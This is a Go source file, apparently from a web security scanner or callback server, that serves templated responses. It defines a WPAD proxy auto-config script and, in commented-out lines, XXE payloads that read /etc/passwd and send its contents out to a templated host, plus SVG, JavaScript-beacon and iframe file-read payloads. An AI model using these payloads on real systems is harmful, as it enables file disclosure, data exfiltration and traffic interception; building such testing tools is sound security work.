package httpx

import (
	"fmt"
	"net/http"
	"strings"
	"text/template"
)

const WPAD_SCRIPT = "function FindProxyForURL(url, host){if ((host == \"localhost\") || shExpMatch(host, \"localhost.*\") ||(host == \"127.0.0.1\") || isPlainHostName(host)) return \"DIRECT\"; if (dnsDomainIs(host, \"{{.ProxySrvRegex}}\")||shExpMatch(host, \"(*.{{.ProxySrvRegex}}|{{.ProxySrvRegex}})\")) return \"DIRECT\"; return 'PROXY {{.ProxySrv}}:3128; PROXY {{.ProxySrv}}:3141; DIRECT';}"

type SimpleResponse struct {
	Path        string
	ContentType string
	Payload     *template.Template
}

func (h *SimpleResponse) ShouldHandle(r *http.Request) bool {
	return strings.HasSuffix(r.URL.Path, h.Path)
}

func (h *SimpleResponse) Process(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", h.ContentType)

	h.Payload.Execute(w, map[string]string{
		"ProxySrvRegex": "127\\.0\\.0\\.1",
		"ProxySrv":      "127.0.0.1",
		"Host":          r.URL.Host,
		"AlertPattern":  "l",
	})

	fmt.Fprint(w, h.Payload)
}

func initSimplePayloads() {

	//CreateTemplate := func(name, t string) *template.Template {
	//	return template.Must(template.New(name).Parse(t))
	//}

	//payloads = append(payloads, &SimpleResponse{Path: "/wpad.dat", ContentType: "text/javascript", Payload: CreateTemplate("wpad", WPAD_SCRIPT)})
	//payloads = append(payloads, &SimpleResponse{Path: "/sh.xml", ContentType: "text/xml", Payload: CreateTemplate("sh", `<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\n<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n<text font-size="16" x="0" y="16">&xxe;</text>\n</svg>`)})
	//payloads = append(payloads, &SimpleResponse{Path: "/dt.xml", ContentType: "text/xml", Payload: CreateTemplate("dt", `<?xml version="1.0" encoding="ISO-8859-1"?>\n <!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .AlertPattern }}/xxe-test" >]><foo>&xxe;</foo>`)})
	//payloads = append(payloads, &SimpleResponse{Path: "/evil.dtd", ContentType: "text/xml", Payload: CreateTemplate("evil.dtd", `<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;'>">`)})
	//payloads = append(payloads, &SimpleResponse{Path: "/js", ContentType: "text/javascript", Payload: CreateTemplate("js", `var s = document.createElement("img");document.body.appendChild(s); s.src="//{{ .Host }}/{{.AlertPattern}}/s";`)})
	//payloads = append(payloads, &SimpleResponse{Path: "/ht", ContentType: "text/html", Payload: CreateTemplate("ht", `<html><body><img src="{{.AlertPattern}}/static-lh" /><iframe src="file:///etc/passwd" height="500"></iframe></body></html>`)})
	//payloads = append(payloads, &SimpleResponse{Path: "/sv", ContentType: "image/svg+xml", Payload: CreateTemplate("sv", `<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>`)})

}
